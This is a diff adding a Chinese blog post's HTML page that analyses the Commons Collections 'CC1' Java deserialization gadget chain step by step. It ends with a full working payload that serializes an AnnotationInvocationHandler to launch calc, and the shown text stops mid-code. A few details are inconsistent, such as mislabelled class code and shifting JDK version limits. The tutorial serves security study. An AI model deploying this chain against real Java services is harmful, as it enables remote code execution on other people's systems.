@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang='en' ><meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+
+
+<title>CC1利用链分析 | Tigger的个人博客</title>
+
+<meta name="generator" content="Hugo Eureka 0.8.3" />
+<link rel="stylesheet" href="/css/eureka.min.css">
+<script defer src="/js/eureka.min.js"></script>
+
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/highlight.min.js"
+   crossorigin></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/js/all.min.js"
+   integrity="sha256-uNYoXefWRqv&#43;PsIF/OflNmwtKM4lStn9yrz2gVl6ymo="  crossorigin></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+   integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3&#43;Aro6EYUG4&#43;cU&#43;KJWu/X"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" 
+  integrity="sha384-g7c&#43;Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI&#43;sEnkvrMWph2EDg4"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+   integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC&#43;Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js" 
+  integrity="sha256-Zmpaaj&#43;GXFsPF5WdPArSrnW3b30dovldeKsW00xBVwE="  crossorigin></script>
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="/images/icon_hufb844258c9fcf66825cf899634e8be15_276589_32x32_fill_box_center_3.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/icon_hufb844258c9fcf66825cf899634e8be15_276589_180x180_fill_box_center_3.png">
+
+<meta name="description"
+  content="TransformedMap利用链是最早的Java反序列化利用链">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Posts",
+      "item":"/posts/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"CC1利用链分析",
+      "item":"/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"
+    },
+    "headline": "CC1利用链分析 | Tigger的个人博客","datePublished": "2021-10-16T00:00:00+00:00",
+    "dateModified": "2021-10-16T00:00:00+00:00",
+    "wordCount":  1272 ,
+    "author": {
+        "@type": "Person",
+        "name": ["Tigger"]
+    },
+    "publisher": {
+        "@type": "Person",
+        "name": "Tigger",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "/images/icon.png"
+        }
+        },
+    "description": "TransformedMap利用链是最早的Java反序列化利用链"
+}
+</script><meta property="og:title" content="CC1利用链分析 | Tigger的个人博客" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="/images/icon.png">
+
+
+<meta property="og:url" content="/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" />
+
+
+
+<meta property="og:description" content="TransformedMap利用链是最早的Java反序列化利用链" />
+
+
+
+<meta property="og:locale" content="en" />
+
+
+
+
+<meta property="og:site_name" content="Tigger的个人博客" />
+
+
+
+
+
+
+<meta property="article:published_time" content="2021-10-16T00:00:00&#43;00:00" />
+
+
+<meta property="article:modified_time" content="2021-10-16T00:00:00&#43;00:00" />
+
+
+
+<meta property="article:section" content="posts" />
+
+
+<meta property="article:tag" content="Java安全" />
+
+<meta property="article:tag" content="web" />
+
+
+
+
+
+<meta property="og:see_also" content="/posts/j1/" />
+
+
+
+<body class="flex flex-col min-h-screen">
+  <header class="fixed flex items-center w-full min-h-16 pl-scrollbar z-50 bg-secondary-bg shadow-sm">
+    <div class="w-full max-w-screen-xl mx-auto"><script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
+        document.getElementsByTagName('html')[0].classList.add('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="mr-6 text-primary-text text-xl font-bold">Tigger的个人博客</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div id="target"
+        class="hidden block md:flex md:flex-grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:flex-grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  mr-4">关于我</a>
+            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  mr-4">文章</a>
+            <a href="/docs/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  mr-4">文档</a>
+        </div>
+
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-adjust"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col left-0 md:left-auto right-auto md:right-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">Light</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">Dark</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">Auto</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == null || storageColorScheme == 'Auto') {
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    } else if (storageColorScheme == "Dark") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'moon')
+        element.firstElementChild.classList.add('fa-moon')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+  </header>
+  <main class="flex-grow pt-16">
+    <div class="pl-scrollbar">
+      <div class="w-full max-w-screen-xl lg:px-4 xl:px-8 mx-auto">
+
+
+<div class="grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12">
+    <div
+        class="col-span-2  lg:col-span-6 bg-secondary-bg rounded px-6 py-8">
+        <h1 class="font-bold text-3xl text-primary-text">CC1利用链分析</h1>
+        <div class="flex flex-wrap flex-row items-center mt-2 text-tertiary-text">
+    <div class="mr-6 my-2">
+        <i class="fas fa-calendar mr-1"></i>
+        <span>2021-10-16</span>
+    </div>
+    <div class="mr-6 my-2">
+        <i class="fas fa-clock mr-1"></i>
+        <span>6 min read</span>
+    </div>
+    
+    
+    <div class="mr-6 my-2">
+        <i class="fas fa-folder mr-1"></i>
+        
+        <a href="/categories/web/" class="hover:text-eureka">web</a>
+        
+    </div>
+    
+
+    
+</div>
+        
+        
+        
+
+        <div class="content">
+            <p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection(集合)</code>相关类对象。</p>
+<p>在该组件中有一个Transformer接口，实现了该接口的类有 ConstantTransformer、invokerTransformer、ChainedTransformer、TransformedMap等等</p>
+<h2 id="一复现环境">一、复现环境</h2>
+<p>环境：</p>
+<p>maven依赖</p>
+<pre><code class="language-java">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;commons-collections&lt;/groupId&gt;
+&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+&lt;version&gt;3.1&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="二分析">二、分析</h2>
+<h3 id="constanttransformer类">ConstantTransformer类</h3>
+<p>该类是对Transformer类的实现。</p>
+<p>可以看到该类重写了transform方法，并且调用了Closure.execute方法，并且返回一个对象。</p>
+<p>简单来说，如果实例化ConstantTransformer对象的时候传入的是A类实例，那么我们调用该对象的transform对象的时候就会返回A类的实例。</p>
+<p>也就是它的作用是对对象进行了输入输出的转化。</p>
+<pre><code class="language-java">public class ClosureTransformer implements Transformer, Serializable {
+    private static final long serialVersionUID = 478466901448617286L;
+    private final Closure iClosure;
+
+    public static Transformer getInstance(Closure closure) {
+        if (closure == null) {
+            throw new IllegalArgumentException(&quot;Closure must not be null&quot;);
+        } else {
+            return new ClosureTransformer(closure);
+        }
+    }
+
+    public ClosureTransformer(Closure closure) {
+        this.iClosure = closure;
+    }
+
+    public Object transform(Object input) {
+        this.iClosure.execute(input);
+        return input;
+    }
+
+    public Closure getClosure() {
+        return this.iClosure;
+    }
+}
+</code></pre>
+<h3 id="invokertransformer">InvokerTransformer</h3>
+<p>在<code>Collections</code>组件中提供了一个非常重要的类: <code>org.apache.commons.collections.functors.InvokerTransformer</code>，这个类实现了:<code>java.io.Serializable</code>接口。2015年有研究者发现利用<code>InvokerTransformer</code>类的<code>transform</code>方法可以实现Java反序列化<code>RCE</code>，并提供了利用方法:<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">CommonsCollections1.java</a>。</p>
+<p><code>InvokerTransformer</code>类实现了<code>org.apache.commons.collections.Transformer</code>接口,<code>Transformer</code>提供了一个对象转换方法：<code>transform</code>，<strong>主要用于将输入对象转换为输出对象</strong>。<code>InvokerTransformer</code><strong>类的主要作用就是利用Java反射机制来创建类实例。</strong></p>
+<p><strong><code>InvokerTransformer</code>类的<code>transform</code>方法：</strong></p>
+<p>可以看到，该类主要作用是调用传入类的任意方法。并且它是通过反射去实现的。</p>
+<pre><code class="language-java">
+ public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+        super();
+        iMethodName = methodName;
+        iParamTypes = paramTypes;
+        iArgs = args;
+    }
+public Object transform(Object input) {
+    if (input == null) {
+        return null;
+    }
+    try {
+          // 获取输入类的类对象
+        Class cls = input.getClass();
+
+          // 通过输入的方法名和方法参数，获取指定的反射方法对象
+        Method method = cls.getMethod(iMethodName, iParamTypes);
+
+          // 反射调用指定的方法并返回方法调用结果
+        return method.invoke(input, iArgs);
+
+    } catch (Exception ex) {
+        // 省去异常处理部分代码
+    }
+}
+
+
+</code></pre>
+<p>一般来说，想要RCE，需要使用到Runtime这个类，但是Runtime的构造函数是一个私有方法，所以不能够直接对其进行实例化。</p>
+<p><strong>使用<code>InvokerTransformer</code>实现调用本地命令执行方法：</strong></p>
+<p>这里直接传入了一个Runtime实例，并且调用了exec方法。</p>
+<pre><code class="language-java">public static void main(String[] args) {
+      // 定义需要执行的本地系统命令
+        String cmd = &quot;calc.exe&quot;;
+
+    // 构建transformer对象
+    InvokerTransformer transformer = new InvokerTransformer(
+          &quot;exec&quot;, new Class[]{String.class}, new Object[]{cmd}
+    );
+
+    // 传入Runtime实例，执行对象转换操作
+    transformer.transform(Runtime.getRuntime());
+}
+</code></pre>
+<p>以上写法直接实例化了一个Runtime对象，但是<strong>Runtime类并没有实现序列化接口</strong>（可以去看源码），也就是说，<strong>Runtime实例对象不能够被序列化</strong>，因此在构建Payload的时候，尽量在程序中不要出现Runtime实例化出来的对象，因此需要两个类:</p>
+<p>上面说的ConstantTransformer类和ChainedTransformer类</p>
+<h3 id="chainedtransformer">ChainedTransformer</h3>
+<p>该类的主要作用是链式调用transform。</p>
+<pre><code class="language-java">public class ChainedTransformer implements Transformer, Serializable {
+
+  /** The transformers to call in turn */
+  private final Transformer[] iTransformers;
+
+  // 省去多余的方法和变量
+
+  public ChainedTransformer(Transformer[] transformers) {
+    super();
+    iTransformers = transformers;
+  }
+
+  public Object transform(Object object) {
+      for (int i = 0; i &lt; iTransformers.length; i++) {
+          object = iTransformers[i].transform(object);
+      }
+      return object;
+  }
+
+}
+</code></pre>
+<p>ChainedTransformer链执行命令：</p>
+<pre><code class="language-java">public static void main(String[] args) {
+      // 定义需要执行的本地系统命令
+        String cmd = &quot;calc.exe&quot;;
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{
+                        String.class, Class[].class}, new Object[]{
+                        &quot;getRuntime&quot;, new Class[0]}
+                ),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{
+                        Object.class, Object[].class}, new Object[]{
+                        null, new Object[0]}
+                ),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{cmd})
+        };
+
+        // 创建ChainedTransformer调用链对象
+        Transformer transformedChain = new ChainedTransformer(transformers);
+
+      // 执行对象转换操作
+      transformedChain.transform(null);
+}
+</code></pre>
+<blockquote>
+<p>注意：</p>
+<p>InvokerTransformer 是调用对象的方法，并且需要传入该方法所需要的参数类型，所以Class[].class和是为了占位。</p>
+<p><img src="assets/image-20211028164001-f3nipvm.png" alt="image.png"></p>
+</blockquote>
+<p>该 transformedChain 调用链每次循环后返回对象如图，简单来讲，就是ConstantTransformer得到一个Class对象，然后使用InvokerTransformer连续调用方法。</p>
+<p><img src="assets/%E6%9C%AA%E5%91%BD%E5%90%8D%E8%A1%A8%E5%8D%95-20211016090555-lcyevm6.png" alt="未命名表单.png"></p>
+<p>到了这里我们会发现，只要目标对传入的对象调用了transform方法就会触发RCE（这里的transformedChain就是我们试图传入的目标）。</p>
+<p>那么什么情况下会对可控对象调用transform方法呐？最好的利用情况是当用户传入的输入流被反序列化以后，就能够直接进行攻击（也就是说当程序直接调用readObject方法时将触发漏洞），但实际上并没有，所以需要继续往下找。</p>
+<h3 id="transformedmap类">TransformedMap类</h3>
+<p>在org.apache.commons.collections.map.TransformedMap 类中，我们观察一下该类的作用：</p>
+<p>首先是该类的构造方法受到了保护，需要通过decorate 方法创建。</p>
+<pre><code class="language-java">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+        return new TransformedMap(map, keyTransformer, valueTransformer);
+    }
+protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+        super(map);
+        this.keyTransformer = keyTransformer;
+        this.valueTransformer = valueTransformer;
+    }
+</code></pre>
+<p>然后观察它的checkSetValue方法：</p>
+<pre><code class="language-java">protected Object checkSetValue(Object value) {
+        return valueTransformer.transform(value);
+    }
+</code></pre>
+<p>可以看到该方法会<strong>直接调用valueTransformer.transform</strong>,而valueTransformer是我们可以直接通过decorate构建的。换句话说，只要我们可以构建TransformedMap类（传入transformedChain对象）并调用其checkSetValue就可以RCE。</p>
+<p>那么有什么类会构建TransformedMap类对象并且调用checkSetValue方法呐？</p>
+<h3 id="abstractinputcheckedmapdecoratormapentry">AbstractInputCheckedMapDecorator.MapEntry</h3>
+<p>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator类是TransformedMap类的父类，其中定义了一个内部类：</p>
+<p>继承自AbstractMapEntryDecorator类的MapEntry类，观察一下代码</p>
+<pre><code class="language-java">   static class MapEntry extends AbstractMapEntryDecorator {
+
+        /** The parent map */
+        private final AbstractInputCheckedMapDecorator parent;
+
+        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
+            super(entry);
+            this.parent = parent;
+        }
+
+        public Object setValue(Object value) {
+            value = parent.checkSetValue(value);
+            return entry.setValue(value);
+        }
+    }
+</code></pre>
+<p>可以看到，它的setValue 方法会调用其parent的checkSetValue方法，只要我们在构建MapEntry对象的时候parent设置传入TransformedMap类对象，然后并且调用setValue即可RCE。所以我们现在应该想谁会创建MapEntry对象并且调用setValue方法。</p>
+<h3 id="annotationinvocationhandler类jdk版本要小于18">AnnotationInvocationHandler类（JDK版本要小于1.8）</h3>
+<p>这个类是Java 就是内部类sun.reflect.annotation.AnnotationInvocationHandler,从注释可见该类是Annotation的动态代理实现类。</p>
+<p>源代码：<a href="http://www.docjar.com/html/api/sun/reflect/annotation/AnnotationInvocationHandler.java.html">http://www.docjar.com/html/api/sun/reflect/annotation/AnnotationInvocationHandler.java.html</a></p>
+<p>我们来看一下这个类重写的readObject方法：</p>
+<pre><code class="language-java">  328       private void readObject(java.io.ObjectInputStream s)
+  329           throws java.io.IOException, ClassNotFoundException {
+  330           s.defaultReadObject();
+  331   
+  332   
+  333           // Check to make sure that types have not evolved incompatibly
+  334   
+  335           AnnotationType annotationType = null;
+  336           try {
+  337               annotationType = AnnotationType.getInstance(type);
+  338           } catch(IllegalArgumentException e) {
+  339               // Class is no longer an annotation type; all bets are off
+  340               return;
+  341           }
+  342   
+  343           Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
+  344   
+  345           for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {
+  346               String name = memberValue.getKey();
+  347               Class&lt;?&gt; memberType = memberTypes.get(name);
+  348               if (memberType != null) {  // i.e. member still exists
+  349                   Object value = memberValue.getValue();
+  350                   if (!(memberType.isInstance(value) ||
+  351                         value instanceof ExceptionProxy)) {
+  352                       memberValue.setValue(
+  353                           new AnnotationTypeMismatchExceptionProxy(
+  354                               value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
+  355                                   annotationType.members().get(name)));
+  356                   }
+  357               }
+  358           }
+  359       }
+</code></pre>
+<p>从代码中可见该方法依次进行以下操作：</p>
+<ul>
+<li>
+<p>1.调用defaultReadObject()进行默认的反序列化。</p>
+</li>
+<li>
+<p>2.实例化一个AnnotationType类，该类为一个运行时的注解类，用于类型检查注释和应用成员默认值。
+注意：这里使用了getInstance(type)来创建实例，其代码为：</p>
+<pre><code class="language-java">  public static AnnotationType getInstance(
+        Class&lt;? extends Annotation&gt; annotationClass)
+    {
+        JavaLangAccess jla = sun.misc.SharedSecrets.getJavaLangAccess();
+        AnnotationType result = jla.getAnnotationType(annotationClass); // volatile read
+        if (result == null) {
+            result = new AnnotationType(annotationClass);
+            // try to CAS the AnnotationType: null -&gt; result
+            if (!jla.casAnnotationType(annotationClass, null, result)) {
+                // somebody was quicker -&gt; read it's result
+                result = jla.getAnnotationType(annotationClass);
+                assert result != null;
+            }
+        }
+
+        return result;
+    }
+</code></pre>
+<p>主要还是：</p>
+<pre><code class="language-java">new AnnotationType(annotationClass)
+</code></pre>
+<p>注意：这里传入了一个type参数，类型为annotation的Class。该type参数在该类的代码：</p>
+<pre><code class="language-java">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) {
+          this.type = type;
+          this.memberValues = memberValues;
+       }
+</code></pre>
+</li>
+<li>
+<p>3.调用AnnotationType.memberTypes()方法得到一个Map类。</p>
+<pre><code class="language-java">    public Map&lt;String, Class&lt;?&gt;&gt; memberTypes() {
+        return memberTypes;
+    }
+</code></pre>
+<p>而memberTypes由如下定义：</p>
+</li>
+<li>
+<pre><code class="language-java">private AnnotationType(final Class&lt;? extends Annotation&gt; annotationClass) {
+        if (!annotationClass.isAnnotation())
+            throw new IllegalArgumentException(&quot;Not an annotation type&quot;);
+
+        Method[] methods =
+            AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() {
+                public Method[] run() {
+                    // Initialize memberTypes and defaultValues
+                    return annotationClass.getDeclaredMethods();
+                }
+            });
+
+        memberTypes = new HashMap&lt;String,Class&lt;?&gt;&gt;(methods.length+1, 1.0f);
+        memberDefaults = new HashMap&lt;String, Object&gt;(0);
+        members = new HashMap&lt;String, Method&gt;(methods.length+1, 1.0f);
+
+        for (Method method :  methods) {
+            if (Modifier.isPublic(method.getModifiers()) &amp;&amp;
+                Modifier.isAbstract(method.getModifiers()) &amp;&amp;
+                !method.isSynthetic()) {
+                if (method.getParameterTypes().length != 0) {
+                    throw new IllegalArgumentException(method + &quot; has params&quot;);
+                }
+                String name = method.getName();
+                Class&lt;?&gt; type = method.getReturnType();
+                memberTypes.put(name, invocationHandlerReturnType(type));
+                members.put(name, method);
+
+                Object defaultValue = method.getDefaultValue();
+                if (defaultValue != null) {
+                    memberDefaults.put(name, defaultValue);
+                }
+            }
+        }
+</code></pre>
+</li>
+<li>
+<p>这里分析一下代码，判断是否为Annotation Class之后得到了所有方法并且取消保护（doPrivileged），然后将所有方法做了判断，符合条件的话放入memberTypes（方法名，该方法返回的类型）。</p>
+<pre><code class="language-java">public static Class&lt;?&gt; invocationHandlerReturnType(Class&lt;?&gt; type) {
+        // Translate primitives to wrappers
+        if (type == byte.class)
+            return Byte.class;
+        if (type == char.class)
+            return Character.class;
+        if (type == double.class)
+            return Double.class;
+        if (type == float.class)
+            return Float.class;
+        if (type == int.class)
+            return Integer.class;
+        if (type == long.class)
+            return Long.class;
+        if (type == short.class)
+            return Short.class;
+        if (type == boolean.class)
+            return Boolean.class;
+
+        // Otherwise, just return declared type
+        return type;
+    }
+</code></pre>
+</li>
+<li>
+<p>再次回到343行代码就清楚memberTypes 的内容是什么了。当然这里只是顺手做了一下分析，我们主要还是要看memberValues.entrySet()，我<strong>们在352行看到对memberValue调用了setValue()方法</strong>。那么memberValue有没有可能是MapEntry对象呐，我们向上关注一下memberValues，它是一个Map对象，所以我们需要一个实现了entrySet()方法的作用是返回一系列MapEntry类对象的类：
+在TransformedMap类的父类AbstractInputCheckedMapDecorator类中实现了entrySet()方法</p>
+<pre><code class="language-java">    public Set entrySet() {
+        if (isSetValueChecking()) {
+            return new EntrySet(map.entrySet(), this);
+        } else {
+            return map.entrySet();
+        }
+    }
+</code></pre>
+<p>跟进一下isSetValueChecking()方法：</p>
+<pre><code class="language-java">    protected boolean isSetValueChecking() {
+        return true;
+    }
+</code></pre>
+<p>这里直接返回了true。也就是会返回一个EntrySet(map.entrySet(), this)实例，该类为AbstractInputCheckedMapDecorator的内部类。
+跟进一下EntrySet：</p>
+<pre><code class="language-java">       protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) {
+            super(set);
+            this.parent = parent;
+        }
+</code></pre>
+<p>将该类的parent字段设置为本实例，比如我们如果对一个TransformedMap实例调用entrySet(),那么他会返回一个EntrySet类实例，该实例的parent字段为TransformedMap实例，然后collection为空的Map.Entry对象。</p>
+</li>
+<li>
+<p>再继续往下走就到了循环了，我们知道使用for (:) 循环实际是通过迭代器实现的，而</p>
+</li>
+</ul>
+<p>EntrySet 是实现了迭代器的：</p>
+<pre><code class="language-java">public Iterator iterator() {
+            return new EntrySetIterator(collection.iterator(), parent);
+        }
+</code></pre>
+<p>跟进一下EntrySetIterator 类，它也是位于AbstractInputCheckedMapDecorator类的内部类，可以传入一个迭代器（这里传入的是Map.Entry 对象迭代器），以及parent字段值。</p>
+<p>然后设置EntrySetIterator的parent字段值也是parent，iterator 字段为Map.Entry 对象迭代器。</p>
+<pre><code class="language-java"> static class EntrySetIterator extends AbstractIteratorDecorator {
+    
+        /** The parent map */
+        private final AbstractInputCheckedMapDecorator parent;
+    
+        protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) {
+            super(iterator);
+            this.parent = parent;
+        }
+    
+        public Object next() {
+            Map.Entry entry = (Map.Entry) iterator.next();
+            return new MapEntry(entry, parent);
+        }
+    }
+</code></pre>
+<p>最后调用next() 方法，其返回的是一个MapEntry对象。</p>
+<p>到这里就基本完成了，如果进入了循环并且满足条件就会对MapEntry对象调用setValue。</p>
+<p>根据之前的结论来看就可以完成RCE了。</p>
+<p>总结一下我们传入一个构造好的AnnotationInvocationHandler对象，目标对其进行反序列，便会造成任意代码执行。</p>
+<p>然后我们构建的AnnotationInvocationHandler类的构造方法：</p>
+<pre><code class="language-java">   AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) {
+        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();
+        if (!type.isAnnotation() ||
+            superInterfaces.length != 1 ||
+            superInterfaces[0] != java.lang.annotation.Annotation.class)
+            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);
+        this.type = type;
+        this.memberValues = memberValues;
+    }
+</code></pre>
+<h3 id="payload">Payload</h3>
+<p>思路总结：</p>
+<p>构建一个ChainedTransformer对象-&gt;置入TransformedMap对象的valueTransformer字段</p>
+<p>-&gt;TransformedMap对象置入AnnotationInvocationHandle对象的memberValues字段。</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.map.HashedMap;
+import org.apache.commons.collections.map.TransformedMap;
+import java.io.*;
+import java.util.HashMap;
+import java.lang.reflect.Constructor;
+import java.util.Map;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+public class test implements Serializable{
+
+public static void main(String[] args) throws Exception
+{
+Transformer[] transformers = {
+new ConstantTransformer(Runtime.class),
+new InvokerTransformer(&quot;getMethod&quot;, new Class[]{ String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0] }),
+new InvokerTransformer(&quot;invoke&quot;, new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),
+new InvokerTransformer(&quot;exec&quot;,
+new Class[] {String.class },
+new Object[] {&quot;calc&quot;})
+};
+Transformer transformerChain = new ChainedTransformer(transformers);
+
+Map map = new HashMap();
+map.put(&quot;value&quot;, &quot;2&quot;);
+
+Map transformedmap = TransformedMap.decorate(map, null, transformerChain);
+
+
+Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
+cons.setAccessible(true);
+
+Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);
+
+//将ins序列化
+ByteArrayOutputStream exp = new ByteArrayOutputStream();
+ObjectOutputStream oos = new ObjectOutputStream(exp);
+oos.writeObject(ins);
+oos.flush();
+oos.close();
+
+//取出序列化的数据流进行反序列化，验证
+ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
+ObjectInputStream ois = new ObjectInputStream(out);
+Object obj = (Object) ois.readObject();
+
+}
+}
+</code></pre>
+<h2 id="三总结">三、总结</h2>
+<p>从分析中可以看到，TransformedMap利用链依赖于AnnotationInvocationHandler 类的反序列漏洞是很容易触发的，因为它是Java 原生类，当然jdk要小于1.7,高版本已经修复了，比如1.8的该类代码</p>
+<pre><code class="language-java"> ObjectInputStream.GetField fields = s.readFields();
+
+        @SuppressWarnings(&quot;unchecked&quot;)
+        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(&quot;type&quot;, null);
+        @SuppressWarnings(&quot;unchecked&quot;)
+        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);
+
+        // Check to make sure that types have not evolved incompatibly
+
+        AnnotationType annotationType = null;
+        try {
+            annotationType = AnnotationType.getInstance(t);
+        } catch(IllegalArgumentException e) {
+            // Class is no longer an annotation type; time to punch out
+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+        }
+
+        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
+        // consistent with runtime Map type
+        Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();
+
+        // If there are annotation members without values, that
+        // situation is handled by the invoke method.
+        for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) {
+            String name = memberValue.getKey();
+            Object value = null;
+            Class&lt;?&gt; memberType = memberTypes.get(name);
+            if (memberType != null) {  // i.e. member still exists
+                value = memberValue.getValue();
+                if (!(memberType.isInstance(value) ||
